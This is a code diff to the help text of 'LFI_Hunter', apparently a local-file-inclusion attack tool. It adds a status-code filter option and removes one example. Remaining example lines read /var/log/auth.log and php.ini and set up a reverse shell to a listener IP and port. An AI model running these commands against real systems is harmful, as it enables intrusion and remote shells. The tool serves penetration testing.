@@ -50,7 +50,7 @@ class ManPage:
                      --config                        Use a configuration file with all options
                      -FP, --PARAME                   parameter fuzzing [replace the parameter with PARAME in url]
                      -PL, --paramslist               parameter fuzzing wordlist
-
+                     -s,  --status                   Filter parameter with HTTP status responses
 
                      -UV, --Vulnurl URL
                             Specifies the target URL for the web application vulnerable to LFI. 
@@ -230,6 +230,12 @@ class ManPage:
                             Example:
                             LFI_Hunter -FP http://example.com/vulnerable_path?file= -C session_cookie.txt  -PL fuzz_params.txt
 
+                     -s, --status 
+
+                            Filter parameter to specify an HTTP status code for filtering responses.
+                            Accepts a single HTTP status code (e.g., 200, 404, 500), 
+                            to match client errors.
+
               EXAMPLES
               Basic URL scan with authentication and aggressive mode enabled:
               LFI_Hunter -UV http://example.com/vulnerable_path?file= -C session_cookie.txt  --auth -A -LU http://example.com/login.php -U admin -P password
@@ -245,14 +251,7 @@ class ManPage:
 
               Reverse shell setup to a LHOST IP and LPORT:
               LFI_Hunter -UV http://example.com/vulnerable_path?file= -C session_cookie.txt -R /var/log/auth.log -S 192.168.0.10 --port 5555
-              
-              lfi_hunter -UV http://172.17.0.2/vulnerabilities/fi/?page= -C /home/jacstory/.MYTOOLS/LFI_Hunter/cook -R /etc/php/7.0/apache2/php.ini -B --auth -LU http://172.17.0.2/login.php -U admin -P password -PF password -UF username -S 172.17.0.1 --port 5555
-              This command runs lfi_hunter against a vulnerable URL (-UV) for Local File Inclusion (LFI) testing,
-              using cookies from a specified path (-C),trying to read php.ini (-R), 
-              with PHP base64 encoding (-B).
-              It authenticates using credentials at a login URL (--auth, -LU, -U, -P),
-              specifying HTML form field names for the username and password (-UF, -PF). 
-              It sets the local IP (-S) and listener port (--port).
+
               EXIT STATUS
                      0      Successful execution.
                      1      General error, such as invalid command input.
